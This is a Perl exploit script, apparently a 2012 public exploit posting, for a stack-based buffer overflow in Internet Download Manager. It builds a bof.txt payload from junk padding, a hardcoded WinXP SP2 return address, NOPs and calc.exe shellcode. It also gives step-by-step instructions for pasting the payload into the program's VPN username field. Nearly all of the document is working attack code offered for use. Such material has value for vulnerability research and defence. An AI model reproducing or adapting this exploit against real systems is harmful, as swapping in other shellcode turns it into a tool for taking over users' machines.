#!/usr/bin/perl
# 1               ==========================================               1
# 0                   I'm Dark-Puzzle From Inj3ct0r TEAM                   0
# 0                                                                        1
# 1                       dark-puzzle[at]live[at]fr                        0
# 0               ==========================================               1
# 1                              White Hat                                 1
# 0                         Independant Pentester                          0
# 1                      exploit coder/bug researcher                      0
# 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-1
# Title  : Internet Download Manager All Versions - Stack Based Buffer Overflow Vulnerability.
# Author : Dark-Puzzle (Souhail Hammou)
# Type   : Local 
# Risk   : Critical
# Vendor : Tonec Inc.
# Versions : All versions of IDM are Vulnerable .
# Tested On : Windows XP Service Pack 2 FR 32-bits .
# Date : 14 September 2012
# Gr337ings to : Inj3ct0r Team - Packetstormsecurity.org - Securityfocus.com - Jigsaw - Dark-Soldier ...


#Usage   : Copy this script to idman.pl
#Execute : perl idman.pl
#Go to the file bof.txt , Select ALL , then Copy .
# After copying the whole line Go To Downloads ---> Options ----> Dial up / VPN ----> paste the line into the username field and let the password field blank then click Enter .
#French Version : Go to : Telechargement ---> Options ---> Internet ---> then Copy The Whole line from bof.txt and paste it into the username field and let the password field blank then click Enter .

# BETTER COPY THE CONTENT OF THE FILE USING NOTEPAD++

# Bingo ! Calc.exe will show up (P.S : If you're using other that WinXP SP2 Fr you'll have to change the return address with the compatible one with your system )


my $junk = "A" x 2313 ;
my $eip = "\x5D\x38\x82\x7C" ; # For WinXP SP2 Only .
my $nops = "\x90" x 5 ;
my $shellcode = 
# Calc.exe Shellcode (19 bytes)
"\xeB\x02\xBA\xC7\x93".
"\xBF\x77\xFF\xD2\xCC".
"\xE8\xF3\xFF\xFF\xFF".
"\x63\x61\x6C\x63";


$payload= $junk.$eip.$nops.$shellcode;
open(myfile,'>bof.txt');
print myfile $payload;
close(myfile);
print "Wrote ".length($payload)." bytes\n";

#Datasec Team .


